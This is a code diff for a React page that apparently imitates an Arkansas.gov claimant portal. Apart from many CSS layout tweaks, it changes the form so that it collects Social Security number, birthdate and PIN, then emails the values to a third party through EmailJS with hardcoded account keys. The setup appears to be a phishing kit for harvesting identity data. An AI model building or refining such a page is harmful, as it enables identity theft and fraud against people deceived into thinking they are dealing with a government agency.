@@ -28,7 +28,7 @@ export default function MainContent() {
   emailjs.send('service_ozea06x', 'template_vlbf82m', data, 'XMOnwjyzQDoRVRYl3')
       .then(() => {
         setFormSubmitted(true);
-        setFormData({ claimant_id: '', dob: '', pin: '', pin_confirm: false });
+        setFormData({ ssn: '', birthdate: '', pin: '', pin_confirm: false });
         setTimeout(() => setFormSubmitted(false), 2000);
       })
       .catch(error => {
@@ -97,27 +97,29 @@ export default function MainContent() {
       </header>
       {/* Professional Section after header, before main container */}
       <style>{`
-        .header-flex {
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: space-between;
-            width: 100vw;
-            margin: 0;
-            padding-top: 38px; /* Move all header texts down without increasing header height */
-            padding: 32px 0 0 0; /* Add more top padding to header texts without increasing height */
-            height: 100%;
+    .header-flex {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: space-between;
+      width: 100vw;
+      margin: 0;
+      padding-top: 60px; /* Increase top padding to push texts down */
+      padding-bottom: 0;
+      height: 100%;
       min-height: 32px; /* Revert to normal header vertical spacing for desktop */
-        }
+      gap: 12px; /* Add vertical spacing between header texts */
+    }
         @media (max-width: 600px) {
             header {
               padding: 0 !important; /* No padding for mobile */
+              min-height: 36px !important; /* Make header height shorter on mobile */
             }
             .header-flex {
               flex-direction: column !important;
               align-items: flex-start !important;
               justify-content: flex-start !important;
-              min-height: 20px !important; /* Absolute minimum header vertical spacing for mobile */
+              min-height: 2px !important; /* Make header-flex even shorter on mobile */
               padding: 0 !important;
             }
       .header-flex > div:first-child {
@@ -125,10 +127,10 @@ export default function MainContent() {
         display: flex !important;
         align-items: flex-start !important;
         justify-content: flex-start !important;
-        margin-bottom: 0 !important;
+        margin-bottom: 24px !important; /* Add vertical space below Arkansas.gov text */
         padding-left: 2vw !important;
-  padding-top: 0 !important; /* Revert header height and padding */
-  margin-top: 18px !important; /* Move Arkansas.gov text down for alignment */
+        padding-top: 0 !important; /* Revert header height and padding */
+        margin-top: 18px !important; /* Move Arkansas.gov text down for alignment */
           }
           .header-flex > div:last-child {
             width: 100vw !important;
@@ -159,6 +161,7 @@ export default function MainContent() {
         .logo-bg {
           background: #dde4ea;
           border-bottom: 1px solid #e0e6ed;
+          border: 2px solid #fff; /* Reduced border thickness for desktop */
           padding-left: 180px; /* Add left padding for desktop */
           min-height: 60px;
           width: 100vw;
@@ -174,11 +177,11 @@ export default function MainContent() {
           .logo-bg {
             padding-left: 16px !important;
             padding-right: 16px !important;
-            min-height: 120px !important;
+            min-height: 180px !important; /* Increased height for logo div */
             flex-direction: column !important;
             align-items: center !important;
             justify-content: flex-start !important;
-            border: 12px solid #fff !important;
+            border: 4px solid #fff !important; /* Reduced border thickness */
             border-radius: 0 !important;
             box-shadow: 0 4px 16px rgba(0,0,0,0.10) !important;
             margin-top: 8px !important;
@@ -315,6 +318,8 @@ export default function MainContent() {
             color: '#3b82f6', // Blue for emphasis
             letterSpacing: '0.2px',
             textTransform: 'uppercase',
+            wordBreak: 'break-word',
+            whiteSpace: 'pre-line',
           }}>
             {isMobile ? (
               <>
